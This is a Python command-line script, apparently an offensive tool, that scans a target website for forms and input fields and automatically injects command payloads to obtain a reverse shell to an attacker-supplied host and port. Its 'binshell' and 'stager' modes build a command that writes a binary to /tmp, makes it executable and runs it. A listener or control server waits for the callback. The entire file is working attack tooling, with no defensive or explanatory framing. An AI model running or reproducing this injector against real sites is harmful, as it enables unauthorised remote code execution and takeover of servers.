#!/usr/bin/python3

import argparse

from payloads import Monkey, Generator

from server import ReverseListener, ControlTower

import random
import string
import time
import threading

parser = argparse.ArgumentParser(description='Test')


def randword(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))


def comma_separated(names):
    return names.split(',')


PAYLOAD_TYPES = ['shell', 'binshell', 'stager', 'custom']

STAGER_CONTROL_PORT = random.randint(12000, 20000)  # should this be an arg?

parser.add_argument('target_url', help='Target URL')
parser.add_argument('-lhost', '--lhost', help='Server ip the payload connects to', default='127.0.0.1')
parser.add_argument('-lport', '--lport', help="Port the payload connects to", default=random.randint(12000, 20000))
parser.add_argument('-ptype', '--ptype', help=f"Port of the server the payload connects to: {', '.join(PAYLOAD_TYPES)}", default='shell')
parser.add_argument('-payload', '--payload', help="if ptype is custom, provide your own string to inject", default=None)
parser.add_argument('-names', type=comma_separated, help="Comma-separated list of names to inject (website input points of your choosing)", default=[])
parser.add_argument('-v', '--verbose', action='store_true', help='Increase output verbosity')

args = parser.parse_args()

print(f"target_url: {args.target_url}")

if args.verbose:
    pass
    # TODO

if not args.target_url:
    print("Target URL required")
    exit(1)

if args.ptype not in PAYLOAD_TYPES:
    print("\n")
    print(f"-ptype should be one of [{', '.join(PAYLOAD_TYPES)}]")
    exit(1)

if args.ptype == 'custom' and not args.payload:
    print("\n")
    print("-ptype is set to custom but no payload is provided")
    exit(1)

if "http" not in args.target_url:
    print("\n")
    print("No protocol specified")
    exit(1)

if not args.lhost:
    print("\n")
    print("No -lhost specified")
    exit(1)

LHOST = args.lhost
LPORT = args.lport

inject_success = False


def on_recv(data):
    print("".join([d.decode() for d in data]))


def on_shell(addr):
    global inject_success
    inject_success = True


try:
    monkey = Monkey(args.target_url)

    generator = Generator(lhost=LHOST, lport=LPORT)

    def try_inject(pl):
        if monkey.get_forms():
            print("Injecting via forms")
            monkey.autoinject_forms(pl)

        if monkey.get_inputs() and not inject_success:
            print("Injecting with names found in inputs")
            monkey.autoinject_urls(pl)

        if monkey.get_inputs() and not inject_success and (len(args.names) > 0):
            print("Injecting via endpoints with custom names")
            shell = generator.ir_shell()
            monkey.autoinject_urls(shell)

    if monkey.get_forms() is None and monkey.get_inputs() is None:
        print("Nowhere to inject")
        exit(1)

    if args.ptype == 'shell':
        listener = ReverseListener(
            ip=LHOST, port=LPORT, cmd_cb=None, recv_cb=on_recv, success_cb=on_shell, once=False)

        listener.start()

        pl = generator.ir_shell()

        try_inject(pl)

    elif args.ptype == 'binshell':
        listener = ReverseListener(
            ip=LHOST, port=LPORT, cmd_cb=None, recv_cb=on_recv, success_cb=on_shell, once=False)

        listener.start()

        pl_bin = generator.ir_bin()
        n = randword(4)
        pl = f'printf "{pl_bin}" > /tmp/{n} && chmod +x /tmp/{n} && /tmp/{n}'

        try_inject(pl)

    elif args.ptype == 'stager':
        pl_bin = Generator.bin_stager(lhost=LHOST, lport=STAGER_CONTROL_PORT)
        n = randword(4)
        pl = f'printf "{pl_bin}" > /tmp/{n} && chmod +x /tmp/{n} && /tmp/{n}'

        def on_connect(ct):
            global inject_success
            inject_success = True
            print('Stager injected, what to do?')
            test = input('>')
            print('TEST', test)

        ct = ControlTower(ip=LHOST, port=int(STAGER_CONTROL_PORT), success_cb=on_connect)

        ct.start()

        try_inject(pl)

        t = threading.Thread(target=lambda x: [time.sleep(x) for _ in range(1, 100000)], args=(1000,))
        t.start()

    elif args.ptype == 'custom':
        listener = ReverseListener(
            ip=LHOST, port=LPORT, cmd_cb=None, recv_cb=on_recv, success_cb=on_shell, once=False)

        listener.start()

        pl = args.payload

        try_inject(pl)

    if not inject_success and args.ptype != 'stager':
        print("\n")
        if not args.payload:  # if we don't care about output
            print("Failed :(")
            print("Try a different payload type")

except KeyboardInterrupt:  # ctrl-c
    quit()
